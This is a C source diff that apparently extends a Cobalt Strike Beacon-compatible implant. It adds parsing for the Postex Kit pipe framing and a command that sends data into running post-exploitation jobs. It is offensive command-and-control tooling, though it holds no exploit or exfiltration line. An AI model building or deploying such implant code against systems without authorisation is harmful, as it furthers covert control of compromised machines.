@@ -156,8 +156,13 @@ void psh_poll(void(*callback)(char * buffer, int length, int type), int max) {
 	while (temp != NULL) {
 		/* handle the read */
 		if (temp->mode == JOB_MODE_MESSAGE) {
-			/* this is a safe process to get all of a binary blob [len][blob], compatible with write_all */
-			total_read = read_blob_from_pipe(temp->read_stdout, bufferz, max);
+			/* [len][blob] framing, plus the official Postex Kit 4.10 chunk
+			 * framing (see read_postex_message) for execute-dll parity */
+			int type_override = -1;
+			total_read = read_postex_message(temp->read_stdout, bufferz, max, &type_override);
+			if (type_override >= 0) {
+				temp->type = (DWORD)type_override;
+			}
 		}
 		else {
 			/* we assume we're able to get what we need by reading what's available. Good for text output */
@@ -206,6 +211,80 @@ void psh_poll(void(*callback)(char * buffer, int length, int type), int max) {
 
 	/* process dead entries */
 	psh_prune_list();
+}
+
+/* 4.10 execute-dll parity: tolerate the official Postex Kit chunk framing
+ * on top of the classic [int32 LE len][blob] message framing.
+ *
+ * classic (sleeve DLLs, our lineage): [int32 LE len][len bytes blob]
+ * postex kit 2024 (official 4.10+):   [int32 BE len][int32 BE flags|chunkId]
+ *                                      [int32 BE callbackType][payload]
+ * where BE len = sizeof(DWORD) + payload length.
+ *
+ * Detection: read the first 4 bytes; a sane native (LE) reading means the
+ * classic framing; a sane byteswapped reading means a kit chunk. On a kit
+ * chunk the payload is copied out and the embedded callback type comes
+ * back through type_override. Returns bytes copied, 0 = nothing pending,
+ * -1 = pipe gone. */
+int read_postex_message(HANDLE handle, char * buffer, int maxlength, int * type_override) {
+	DWORD avail;
+	int  get = 0;
+	int  rlen;
+	int  swap;
+
+	*type_override = -1;
+
+	if (!PeekNamedPipe(handle, NULL, 0, NULL, &avail, 0)) {
+		return -1;
+	}
+	if (avail <= 0) {
+		return 0;
+	}
+
+	/* read the length field */
+	rlen = read_all(handle, (char *)&get, 4);
+	if (rlen == -1 || rlen != 4) {
+		return -1;
+	}
+
+	/* classic framing sanity: [len][blob] with len <= maxlength */
+	if (get > 0 && get <= maxlength) {
+		return read_all(handle, buffer, get);
+	}
+
+	/* kit chunk sanity: BE(len) counts type(4) + payload */
+	swap = ((get & 0xff) << 24) | ((get & 0xff00) << 8) | ((get >> 8) & 0xff00) | ((get >> 24) & 0xff);
+	if (swap > 8 && swap <= maxlength) {
+		char * chunk;
+		int    ctype;
+		int    payload;
+
+		chunk = (char *)malloc(swap);
+		if (chunk == NULL) {
+			return -1;
+		}
+
+		/* read flags + type + payload in one go */
+		if (read_all(handle, chunk, swap) == -1) {
+			free(chunk);
+			return -1;
+		}
+
+		memcpy(&ctype, chunk + 4, 4);
+		ctype = ((ctype & 0xff) << 24) | ((ctype & 0xff00) << 8) | ((ctype >> 8) & 0xff00) | ((ctype >> 24) & 0xff);
+
+		payload = swap - 8;
+		if (payload > maxlength) {
+			payload = maxlength;
+		}
+		memcpy(buffer, chunk + 8, payload);
+		*type_override = ctype;
+		free(chunk);
+		return payload;
+	}
+
+	/* neither framing makes sense */
+	return -1;
 }
 
 int read_blob_from_pipe(HANDLE handle, char * buffer, int maxlength) {
@@ -458,4 +537,41 @@ void command_job_kill(char * buffer, int length) {
 
 	/* prune our list please */
 	psh_prune_list();
+}
+
+/* 4.10 bjob_send_data parity: write a blob into a running job's pipe.
+ *
+ * wire: [short jid][blob]
+ *
+ * The postex DLL on the other end picks the data up through the kit's
+ * BeaconInputAvailable()/BeaconInputRead() (or our test DLL's equivalent). */
+void command_job_data(char * buffer, int length) {
+	datap       parser;
+	psh_entry * temp = psh_list;
+	int         jid;
+	char *      data;
+	int         dlen;
+	DWORD       written = 0;
+
+	data_init(&parser, buffer, length);
+
+	jid  = data_short(&parser);
+	data = data_buffer(&parser);
+	dlen = data_length(&parser);
+
+	if (dlen <= 0) {
+		return;
+	}
+
+	while (temp != NULL) {
+		if (temp->jid == (DWORD)jid && temp->status != JOB_STATUS_DEAD) {
+			if (!WriteFile(temp->read_stdout, data, dlen, &written, NULL)) {
+				post_error_d(0x55, GetLastError());
+			}
+			return;
+		}
+		temp = (psh_entry*)temp->next;
+	}
+
+	post_error_d(0x56, (DWORD)jid);
 }
